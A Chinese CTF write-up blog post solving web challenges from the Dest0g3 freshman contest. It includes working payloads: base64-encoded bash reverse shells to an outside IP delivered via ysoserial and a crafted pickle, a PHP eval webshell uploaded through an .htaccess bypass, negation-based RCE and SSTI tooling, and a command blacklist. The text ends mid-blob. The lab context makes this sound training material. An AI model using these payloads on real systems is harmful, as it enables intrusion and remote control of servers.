    <content type="html"><![CDATA[<h2 id="EzSerial"><a href="#EzSerial" class="headerlink" title="EzSerial"></a>EzSerial</h2><p><code>admin\admin</code>登录进去，发现Cookie是java反序列化的片段，直接打CC5</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-all.jar  CommonsCollections5  <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44OC4xNS4xNTkvNjY2NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> | <span class="built_in">base64</span> -w 0</span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/8/Dest0g3520%E8%BF%8E%E6%96%B0%E8%B5%9B/1.png" alt="1"></p><p><img src="/../images/achieve/2025/8/Dest0g3520%E8%BF%8E%E6%96%B0%E8%B5%9B/2.png" alt="1"></p><h2 id="phpdest"><a href="#phpdest" class="headerlink" title="phpdest"></a>phpdest</h2><p>之前做到一道WMCTF的题目，其中就是利用<code>require_once</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure><h2 id="EasyPHP"><a href="#EasyPHP" class="headerlink" title="EasyPHP"></a>EasyPHP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;fl4g.php&quot;</span>;</span><br><span class="line"><span class="variable">$dest0g3</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;H&quot;</span>);</span><br><span class="line"><span class="variable">$timme</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;d&quot;</span>);</span><br><span class="line"><span class="variable">$timmme</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;i&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$time</span> &gt; <span class="string">&quot;24&quot;</span>) <span class="keyword">or</span> (<span class="variable">$timme</span> &gt; <span class="string">&quot;31&quot;</span>) <span class="keyword">or</span> (<span class="variable">$timmme</span> &gt; <span class="string">&quot;60&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$fl4g</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try harder!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">set_error_handler</span>(</span><br><span class="line">    function() <span class="keyword">use</span>(&amp;$<span class="title">fl4g</span>) &#123;</span><br><span class="line">        <span class="title">print</span> $<span class="title">fl4g</span>;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"><span class="variable">$fl4g</span> .= <span class="variable">$dest0g3</span>;</span><br><span class="line"><span class="meta">?&gt;</span> Try harder!</span><br></pre></td></tr></table></figure><p><code>set_error_handler</code>函数可以自定义一个捕捉错误的函数，现在一行是字符串拼接我们传入的参数，只要让他报错即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf[]=1</span><br></pre></td></tr></table></figure><h2 id="SimpleRCE"><a href="#SimpleRCE" class="headerlink" title="SimpleRCE"></a>SimpleRCE</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$aaa</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;aaa&#x27;</span>];</span><br><span class="line"><span class="variable">$black_list</span>=<span class="keyword">array</span>(<span class="string">&#x27;^&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;preg&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;%0&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;char&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;md5&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;post&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;ascii&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;replace&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;var&#x27;</span>,<span class="string">&#x27;pastre&#x27;</span>,<span class="string">&#x27;print&#x27;</span>,<span class="string">&#x27;tail&#x27;</span>,<span class="string">&#x27;sed&#x27;</span>,<span class="string">&#x27;pcre&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;scan&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;func&#x27;</span>,<span class="string">&#x27;diff&#x27;</span>,<span class="string">&#x27;ini_&#x27;</span>,<span class="string">&#x27;passthru&#x27;</span>,<span class="string">&#x27;pcntl&#x27;</span>,<span class="string">&#x27;proc_open&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;tac&#x27;</span>,<span class="string">&#x27;more&#x27;</span>,<span class="string">&#x27;sort&#x27;</span>,<span class="string">&#x27;log&#x27;</span>,<span class="string">&#x27;current&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;cut&#x27;</span>,<span class="string">&#x27;bash&#x27;</span>,<span class="string">&#x27;nl&#x27;</span>,<span class="string">&#x27;wget&#x27;</span>,<span class="string">&#x27;vi&#x27;</span>,<span class="string">&#x27;grep&#x27;</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$black_list</span>,<span class="string">&quot;hacker&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$aaa</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>没过滤hex2bin，也可以取反直接RCE</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">negateRce</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$system</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN));</span><br><span class="line"> </span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$command</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN));</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$system</span>).<span class="string">&#x27;)(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$command</span>).<span class="string">&#x27;);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">negateRce</span>();</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/8/Dest0g3520%E8%BF%8E%E6%96%B0%E8%B5%9B/3.png" alt="1"></p><h2 id="EasySSTI"><a href="#EasySSTI" class="headerlink" title="EasySSTI"></a>EasySSTI</h2><p>fenjing打打</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/login</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>d8eb9c60-64df-4b13-9ef4-2afee7797b73.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>30</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://d8eb9c60-64df-4b13-9ef4-2afee7797b73.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://d8eb9c60-64df-4b13-9ef4-2afee7797b73.node5.buuoj.cn:81/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-ini"><span class="attr">username</span>=PAYLOAD&amp;password=<span class="number">1111</span></span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m fenjing crack-request -f 1.txt --host <span class="string">&#x27;d8eb9c60-64df-4b13-9ef4-2afee7797b73.node5.buuoj.cn&#x27;</span> --port 81</span><br></pre></td></tr></table></figure><h2 id="funny-upload"><a href="#funny-upload" class="headerlink" title="funny_upload"></a>funny_upload</h2><p>上传<code>.htaccess</code>绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337</span><br><span class="line">#define height 1337</span><br><span class="line">php_value auto_prepend_file &quot;php://filter/convert.base64-decode/resource=./poc.jpg&quot;</span><br><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>6af69ad2-a500-458e-a652-60db874aa4c1.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>307</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://6af69ad2-a500-458e-a652-60db874aa4c1.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryRlXcRCJvgFTPQ3x0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://6af69ad2-a500-458e-a652-60db874aa4c1.node5.buuoj.cn:81/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryRlXcRCJvgFTPQ3x0</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;file&quot;; filename=&quot;poc.jpg&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: image/jpeg</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryRlXcRCJvgFTPQ3x0</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;1&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">提交</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryRlXcRCJvgFTPQ3x0--</span></span></span><br><span class="line"><span class="language-pgsql"></span></span><br></pre></td></tr></table></figure><h2 id="middle"><a href="#middle" class="headerlink" title="middle"></a>middle</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> config</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session, render_template, url_for,redirect,make_response</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">in</span> [<span class="string">&#x27;config&#x27;</span>] <span class="keyword">and</span> <span class="string">&quot;__&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(sys.modules[module], name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restricted_loads</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    base_dir = os.path.dirname(__file__)</span><br><span class="line">    resp = make_response(<span class="built_in">open</span>(os.path.join(base_dir, __file__)).read()+<span class="built_in">open</span>(os.path.join(base_dir, <span class="string">&quot;config/__init__.py&quot;</span>)).read())</span><br><span class="line">    resp.headers[<span class="string">&quot;Content-type&quot;</span>] = <span class="string">&quot;text/plain;charset=UTF-8&quot;</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/home&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    data=request.form[<span class="string">&#x27;data&#x27;</span>]</span><br><span class="line">    User = restricted_loads(base64.b64decode(data))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(User)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">5000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>pickle反序列化，他这个RestrictedUnpickler，只让从config里面导入，但是<code>config.py</code>里面有<code>os</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>(<span class="params">cmd</span>):</span><br><span class="line">    <span class="comment"># 这里我也改了一下</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(cmd,<span class="built_in">list</span>) :</span><br><span class="line">        s=<span class="string">&#x27;&#x27;</span>.join(cmd)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;!!!!!!!!!!&quot;</span>)</span><br><span class="line">        s=<span class="built_in">eval</span>(s)</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;??????&quot;</span>)</span><br></pre></td></tr></table></figure><p>直接弹shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> config</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">poc</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (config.backdoor,([<span class="string">&quot;os.system(&#x27;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44OC4xNS4xNTkvNjY2NiAwPiYx|base64 -d|bash -i&#x27;)&quot;</span>],))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Poc=base64.b64encode(pickle.dumps(poc())).decode()</span><br><span class="line"><span class="built_in">print</span>(Poc)</span><br></pre></td></tr></table></figure><p>这里参数写成list，因为backdoor里面要进行拼接，然后eval执行</p><h2 id="ezip"><a href="#ezip" class="headerlink" title="ezip"></a>ezip</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Oh you find key:dXBsb2FkLnBocDoKPD9waHAKZXJyb3JfcmVwb3J0aW5nKDApOwppbmNsdWRlKCJ6aXAucGhwIik7CmlmKGlzc2V0KCRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSl7CiAgICBpZihzdHJzdHIoJF9GSUxFU1snZmlsZSddWyduYW1lJ10sIi4uIil8fHN0cnN0cigkX0ZJTEVTWydmaWxlJ11bJ25hbWUnXSwiLyIpKXsKICAgICAgICBlY2hvICJoYWNrZXIhISI7CiAgICAgICAgZXhpdDsKICAgIH0KICAgIGlmKHBhdGhpbmZvKCRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddLCBQQVRISU5GT19FWFRFTlNJT04pIT0iemlwIil7CiAgICAgICAgZWNobyAib25seSB6aXAhISI7CiAgICAgICAgZXhpdDsKICAgIH0KICAgICRNeXppcCA9IG5ldyB6aXAoJF9GSUxFU1snZmlsZSddWyduYW1lJ10pOwogICAgbWtkaXIoJE15emlwLT5wYXRoKTsKICAgIG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ10sICcuLycuJE15emlwLT5wYXRoLicvJyAuICRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKTsKICAgIGVjaG8gIlRyeSB0byB1bnppcCB5b3VyIHppcCB0byAvIi4kTXl6aXAtPnBhdGguIjxicj4iOwogICAgaWYoJE15emlwLT51bnppcCgpKXtlY2hvICJTdWNjZXNzIjt9ZWxzZXtlY2hvICJmYWlsZWQiO30KfQoKemlwLnBocDoKPD9waHAKY2xhc3MgemlwCnsKICAgIHB1YmxpYyAkemlwX25hbWU7CiAgICBwdWJsaWMgJHBhdGg7CiAgICBwdWJsaWMgJHppcF9tYW5hZ2VyOwoKICAgIHB1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgkemlwX25hbWUpewogICAgICAgICR0aGlzLT56aXBfbWFuYWdlciA9IG5ldyBaaXBBcmNoaXZlKCk7CiAgICAgICAgJHRoaXMtPnBhdGggPSAkdGhpcy0+Z2VuX3BhdGgoKTsKICAgICAgICAkdGhpcy0+emlwX25hbWUgPSAkemlwX25hbWU7CiAgICB9CiAgICBwdWJsaWMgZnVuY3Rpb24gZ2VuX3BhdGgoKXsKICAgICAgICAkY2hhcnM9ImFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVowMTIzNDU2Nzg5IjsKICAgICAgICAkbmV3Y2hhcnM9c3RyX3NwbGl0KCRjaGFycyk7CiAgICAgICAgc2h1ZmZsZSgkbmV3Y2hhcnMpOwogICAgICAgICRjaGFyc19rZXk9YXJyYXlfcmFuZCgkbmV3Y2hhcnMsMTUpOwogICAgICAgICRmbnN0ciA9ICIiOwogICAgICAgIGZvcigkaT0wOyRpPDE1OyRpKyspewogICAgICAgICAgICAkZm5zdHIuPSRuZXdjaGFyc1skY2hhcnNfa2V5WyRpXV07CiAgICAgICAgfQogICAgICAgIHJldHVybiBtZDUoJGZuc3RyLnRpbWUoKS5taWNyb3RpbWUoKSoxMDAwMDApOwogICAgfQoKICAgIHB1YmxpYyBmdW5jdGlvbiBkZWxkaXIoJGRpcikgewogICAgICAgIC8v5YWI5Yig6Zmk55uu5b2V5LiL55qE5paH5Lu277yaCiAgICAgICAgJGRoID0gb3BlbmRpcigkZGlyKTsKICAgICAgICB3aGlsZSAoJGZpbGUgPSByZWFkZGlyKCRkaCkpIHsKICAgICAgICAgICAgaWYoJGZpbGUgIT0gIi4iICYmICRmaWxlIT0iLi4iKSB7CiAgICAgICAgICAgICAgICAkZnVsbHBhdGggPSAkZGlyLiIvIi4kZmlsZTsKICAgICAgICAgICAgICAgIGlmKCFpc19kaXIoJGZ1bGxwYXRoKSkgewogICAgICAgICAgICAgICAgICAgIHVubGluaygkZnVsbHBhdGgpOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+ZGVsZGlyKCRmdWxscGF0aCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgY2xvc2VkaXIoJGRoKTsKICAgIH0KICAgIGZ1bmN0aW9uIGRpcl9saXN0KCRkaXJlY3RvcnkpCiAgICB7CiAgICAgICAgJGFycmF5ID0gW107CgogICAgICAgICRkaXIgPSBkaXIoJGRpcmVjdG9yeSk7CiAgICAgICAgd2hpbGUgKCRmaWxlID0gJGRpci0+cmVhZCgpKSB7CiAgICAgICAgICAgIGlmICgkZmlsZSAhPT0gJy4nICYmICRmaWxlICE9PSAnLi4nKSB7CiAgICAgICAgICAgICAgICAkYXJyYXlbXSA9ICRmaWxlOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIHJldHVybiAkYXJyYXk7CiAgICB9CiAgICBwdWJsaWMgZnVuY3Rpb24gdW56aXAoKQogICAgewogICAgICAgICRmdWxscGF0aCA9ICIvdmFyL3d3dy9odG1sLyIuJHRoaXMtPnBhdGguIi8iLiR0aGlzLT56aXBfbmFtZTsKICAgICAgICAkd2hpdGVfbGlzdCA9IFsnanBnJywncG5nJywnZ2lmJywnYm1wJ107CiAgICAgICAgJHRoaXMtPnppcF9tYW5hZ2VyLT5vcGVuKCRmdWxscGF0aCk7CiAgICAgICAgZm9yICgkaSA9IDA7JGkgPCAkdGhpcy0+emlwX21hbmFnZXItPmNvdW50KCk7JGkgKyspIHsKICAgICAgICAgICAgaWYgKHN0cnN0cigkdGhpcy0+emlwX21hbmFnZXItPmdldE5hbWVJbmRleCgkaSksIi4uLyIpKXsKICAgICAgICAgICAgICAgIGVjaG8gInlvdSBiYWQgYmFkIjsKICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBpZighJHRoaXMtPnppcF9tYW5hZ2VyLT5leHRyYWN0VG8oJHRoaXMtPnBhdGgpKXsKICAgICAgICAgICAgZWNobyAiVW56aXAgdG8gLyIuJHRoaXMtPnBhdGguIi8gZmFpbGVkIjsKICAgICAgICAgICAgZXhpdDsKICAgICAgICB9CiAgICAgICAgQHVubGluaygkZnVsbHBhdGgpOwogICAgICAgICRmaWxlX2xpc3QgPSAkdGhpcy0+ZGlyX2xpc3QoIi92YXIvd3d3L2h0bWwvIi4kdGhpcy0+cGF0aC4iLyIpOwogICAgICAgIG